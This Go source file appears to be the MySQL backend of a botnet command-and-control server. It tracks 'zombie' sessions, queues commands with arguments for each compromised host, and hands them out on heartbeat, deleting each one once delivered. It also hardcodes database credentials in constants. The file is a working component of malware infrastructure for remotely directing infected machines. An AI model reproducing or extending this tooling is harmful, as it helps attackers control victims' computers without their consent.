package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"log"
)

// TODO: put this as env vars to avoid leaks (i dont know how to manage it now)
// NOTE: its some random password / usrname, to use in a dev env only, not production !!!
const DB_HOST = "localhost"
const DB_PORT = 3306
const DB_NAME = "hba_db"
const DB_USR = "hba_user"
const DB_PWD = "hbaPass123"

func InitDb() (*sql.DB, error) {
	var db *sql.DB
	dsn := fmt.Sprintf("%s:%s@tcp(%s:%d)/%s", DB_USR, DB_PWD, DB_HOST, DB_PORT, DB_NAME)

	db, err := sql.Open("mysql", dsn)
	if err != nil {
		return nil, fmt.Errorf("Error connecting to DB : %v", err)
	}

	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("Error verifying DB : %v", err)
	}

	return db, nil

}

func IdToSid(id int, db *sql.DB) string {
	query := "SELECT SessionId FROM zombies WHERE id = ?"

	var sid string
	err := db.QueryRow(query, id).Scan(&sid)
	if err != nil {
		if err == sql.ErrNoRows {
			Error("[[ID2SID]] The specified ID does not exist")
		} else {
			log.Fatal(err)
		}
		return ""
	}
	return sid

}

func AddToCmdQueue(sid string, cmd_type string, args []string, db *sql.DB) {
	argsJSON, err := json.Marshal(args)
	if err != nil {
		log.Fatalf("Error while parsing args : %v", err)
	}
	query := "INSERT INTO commandsqueue (SessionId, Type, Args) VALUES (?, ?, ?)"
	_, err = db.Exec(query, sid, cmd_type, string(argsJSON))
	if err != nil {
		log.Fatalf("Error while inserting data : %v", err)

	}
	Log("[[+CMD2Q]] Command succesfully added to queue !")
}

func GetCmdFromQueue(sid string, db *sql.DB) ResHeartBeat {
	var firstRes ResHeartBeat
	var argsJSON string
	query := "SELECT SessionId, Type, Args FROM commandsqueue WHERE SessionId = ? ORDER BY id ASC LIMIT 1;"
	err := db.QueryRow(query, sid).Scan(&firstRes.SessionId, &firstRes.Type, &argsJSON)

	if err != nil {
		if err == sql.ErrNoRows {
			Log("[[+CMD2Q]] No command to send found, skipping...")
			return ResHeartBeat{"", "", []interface{}{}}
		}
		log.Fatal(err)
	}
	err = json.Unmarshal([]byte(argsJSON), &firstRes.Args)
	if err != nil {
		log.Fatal(err)
	}

	query = "DELETE FROM commandsqueue WHERE SessionId = ? ORDER BY id ASC LIMIT 1;"
	_, err1 := db.Query(query, sid)
	if err1 != nil {
		log.Fatal(err)

	}
	return firstRes
}
func ZAvailability(sessionId string, db *sql.DB) bool {

	query := "SELECT SessionId FROM zombies WHERE SessionId = ?"

	var retrievedSessionId string
	err := db.QueryRow(query, sessionId).Scan(&retrievedSessionId)

	if err != nil {
		if err == sql.ErrNoRows {
			DbgMsgEx("[[ZAVLBLT]] Zombie not found", true)
			return false
		}

		log.Fatal(err)
	}
	DbgMsgEx("[[ZAVLBLT]] Zombie found", true)
	return true
}
